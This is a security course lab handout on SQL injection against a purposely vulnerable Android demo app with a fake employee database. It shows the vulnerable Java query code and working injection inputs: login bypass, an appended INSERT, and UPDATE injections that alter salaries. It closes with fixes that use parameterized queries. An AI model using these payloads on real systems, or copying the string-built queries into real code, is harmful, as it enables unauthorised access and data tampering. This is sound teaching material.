# Lab 8: Apps SQL Injection and Defense

SQL injection is basically a technique through which attackers can execute their own malicious SQL statements generally referred as malicious payload. Through the malicious SQL statements, attackers can steal information from the victim database; even worse, they may be able to make changes to the database. 

This lab is adapted from [SEED Labs â€“ SQL Injection Attack Lab](https://seedsecuritylabs.org/Labs_16.04/Web/Web_SQL_Injection/). The major difference between this lab and the one in SEED project is that: SEED lab explores the SQL Injection vulnerability of a remote web server and the attacker does SQL-inject attack via web application front-end input. In our lab, we store all user data of a mobile app in a local database for simplicity, all operations will be demonstrated on an android platform.

## Set-up

We adopt an android app named `SQL Inject Demo` ({download}`sql-inject-demo.apk`, source code availabe [li-xin-yi/sql_inject_demo](https://github.com/li-xin-yi/sql_inject_demo)) as our main environment, it should be installed on an android physical/virtual machine with API >= 17 (Android >= 4.2). We recommand a virtual machine of SDK API 25, which can be easily set-up either via [AVD manager integreated in Android Studio](https://developer.android.com/studio/run/emulator) or [SeedLab virtual machine on Virtual box](https://seedsecuritylabs.org/Labs_16.04/Mobile/SEEDAndroid_VirtualBox.pdf).

## Task 0: Get familiar to the App

This app uses an SQLite database to simulate an employee manage system. After installed on your phone and sign in it first time, it intializes a database `employeeDB.db`, which contains only one table `employee` as:

ID | Name | Password |  SSN | Salary | Nickname | Phone | Email | Address | Birthday
---|---|---|---|---|---|---|---|---|---|
99999 | Admin | admin | 43254314 | 400000 | Ad | (403)220-1191 | admin@hogwarts.edu | Gryffindor House | 1990-03-05
10000 | Alice | alice | 10211002 | 20000 | Ali | (400)210-2112 | alice@hogwarts.edu | Gryffindor House | 2000-09-20
20000 | Boby | boby | 10213352 | 50000 | Bob | (404)789-2313 | boby@hogwarts.edu | Hufflepuff House | 2000-04-20
30000 | Ryan | ryan | 32193525 | 90000|  Ryanny | (210)096-3287 | ryan@hogwarts.edu | Ravenclaw House | 2000-04-10
40000 | Samy | samy | 32111111 | 40000 | Sam | (450)218-8876 | samy@hogwarts.edu | Slytherin House | 2000-01-11 
50000 | Ted | ted | 24343244 | 110000 | Teddy | (208)222-8712 | ted@hogwarts.edu | Azkaban | 2000-11-3

Whenever you want to re-set the database as above, uninstall the app and re-install it or tap on the RESET button.

When you open it, you will first be asked to login in. Just pick one of the users (e.g. username: `Alice`, password `alice`). In general, if you type incorrect username or password, you cannot access the system:

![](./log-in-view.png)



If you log in the system as a normal user (i.e. not Admin), you will enter your own profile page. Meanwhile, you can edit some fields (Nickname, Password, Address, Phone, and Email) and tap "Update" button to update your profile.

![](./profile.png)

However, as a normal user, you cannot modify your ID, Name, SSN, Salary, Birthday or anys information of other users'.

But if you log in with Admin account, you want enter a manage view and see all employees' personal information in the database:

![](./manage-view.png)

When tapping on any item in this page, you will jump to a profile page similar to the one we previously see, except that you can now modify any field of this user, excluding ID.

Even if you exit from the app, all updated data will be stored in the database. Whenever you open the app again, the user data will look like what you last modified.



## Task 1: SQL Injection Attack on SELECT Statement

```{warning}
Suppose that from now, we don't know the passowrd of any user.
```


A typical login page takes user input as arguments of [where cluse](https://www.sqlitetutorial.net/sqlite-where/) to construct an SQL select query, if the database reponses the query with at least one valid result, the user can be authenticated. For example, the code snippet reveals how our app design for the authentication:


```java
public Employee findHandler(String username, String password) {
    String query;
    Cursor cursor;
    SQLiteDatabase db = this.getReadableDatabase();
    Employee employee = null;
    query = "SELECT * FROM " + TABLE_NAME + " WHERE NAME='" + username + "' AND PASSWORD='" + password + "'";
    cursor = db.rawQuery(query, null);
    if (cursor != null && cursor.getCount() > 0 && cursor.moveToFirst()) {
        employee = new Employee(Integer.parseInt(cursor.getString(0)),
                cursor.getString(1),
                cursor.getString(2),
                cursor.getString(3),
                cursor.getString(4),
                cursor.getString(5),
                cursor.getString(6),
                cursor.getString(7),
                Integer.parseInt(cursor.getString(8)),
                cursor.getString(9)
        );
        cursor.close();
    }
    db.close();
    return employee;
}
```

As we have no knowledge about any password, we have to construct a payload to avoid the check of 

```
" WHERE NAME='" + username + "' AND PASSWORD='" + password + "'"
```

Assume we want to login as Admin account as it has more privileges

`````{tabbed} Solution 1
- username: `Admin' --`
- password: `xyz` (You can replace it with any non-empty text)

It constructs the SQL query as:

```sql
SELECT * FROM employee WHERE NAME='Admin' -- AND PASSWORD = 'xyz'
```

`--` serves as a start symbol of a in-line comment, so `AND PASSWORD = 'xyz'` will be regarded as just comment and the validity of password will never be checked.

```{warning}
The in-line command symbol `#` in MYSQL cannot be recongized in SQLite, a payload with `#` may lead the app to crush.
```
`````

`````{tabbed} Solution 2
- username: `Admin`
- password: `anytext' OR '1'='1`

It will result in an SQL query as:

```sql
SELECT * FROM employee WHERE NAME='Admin' AND PASSWORD = 'anytext' OR '1'='1'
```

`````

### Task 1.1: Append a new SQL statement

- username: `a' OR 1=1; INSERT INTO employee (NAME, ID) VALUES ('MUR','11451') --`
- password: `anything`

## Task 2: SQL Injection Attack on UPDATE Statement

If an SQL injection vulnerability happens to an UPDATE statement, the damage can be more severe, because attackers can use the vulnerability to modify databases.

```{warning}
Suppose that from now, we only know the password of a normal user. (e.g. Alice)
```

The typical vulnerable update page takes user's inputs and constructs a UPDATE statement. for example, in our app, a profile update request by normal user is handled by the following code snippet:

```java
public void partialUpdateHandler(Employee employee) {
    // invoked by user, update some optional fields
    String UPDATE_SQL_COMMAND = String.format("UPDATE %s SET NICKNAME='%s', EMAIL='%s', ADDRESS='%s', PASSWORD='%s', PHONE='%s' WHERE ID=%s",
            TABLE_NAME,
            employee.getNickname(),
            employee.getEmail(),
            employee.getAddress(),
            employee.getPassword(),
            employee.getPhone(),
            employee.getId());
    SQLiteDatabase db = this.getWritableDatabase();
    db.execSQL(UPDATE_SQL_COMMAND);
}
```

![](alice.png)

### Task 2.1

As we all know that a normal user cannot modify her own salary, however, from the code snippet above, Alice can edit her profile by changing Phone as

```
00000', SALARY = '9990000
```

to send a UPDATE request as:

```sql
UPDATE employee SET NICKNAME=..., EMAIL =..., ADDRESS=..., PASSWORD =..,               PHONE='00000', SALARY='999000'
WHERE ID = (Alice.id)
```

### Task 2.2

Moveover, Alice can continue to change the salary of Boby by set her own Phone as

```
00000', SALARY=0 WHERE NAME='Boby' --
```

Because it constructs:

```sql
UPDATE employee SET NICKNAME=..., EMAIL =..., ADDRESS=..., PASSWORD =..,               PHONE='00000', SALARY=0
WHERE NAME = 'Boby' -- ' WHERE ID = (Alice.id)
```


It all works when we login with Admin to check:

## Mitigation

From the tasks above, we see what damage a bad-designed query handler for SQL server can cause. Fortunately, an adversary is hard to see the code snippet of retrieving SQL query in a real-word application. However, it is still vulnerable to build query statement by simply joining all arguments like before, as she still can explore all possible injection code by enumerating. The best way to prevent her from injecting unsolicited SQL syntax into any query is to avoid using a completely constructed raw query in `rawQuery`. Instead, we can use a *parameterized statement*, such as SQLiteStatement, which offers both *binding* and *escaping* of arguments.

For example, we can replace the code from line 6-7 in `findHandler` with

```java
query = "SELECT * FROM "+ TABLE_NAME + " WHERE NAME=? AND PASSWORD=?";
cursor = db.rawQuery(query, new String[]{username,password});
```

and rewrite `partialUpdateHandler` method in a safe way as:

```java
public boolean safePartialUpdateHandler(Employee employee)
{
    SQLiteDatabase db = this.getWritableDatabase();
    ContentValues values = new ContentValues();
    values.put("PASSWORD", employee.getPassword());
    values.put("NICKNAME", employee.getNickname());
    values.put("PHONE", employee.getPhone());
    values.put("ADDRESS", employee.getAddress());
    values.put("EMAIL", employee.getEmail());
    return -1!=db.update(TABLE_NAME,values,"ID=?", new String[]{String.valueOf(employee.getId())});
}
```

The question mark `?` is a parameter holder in a SQL query, which is to be compiled with the according argument given in the String ListArray.

We include the alternatives in the app, you just need to turn on the "Safe Mode" Switch when login, and repeat the tasks above, what will happen?
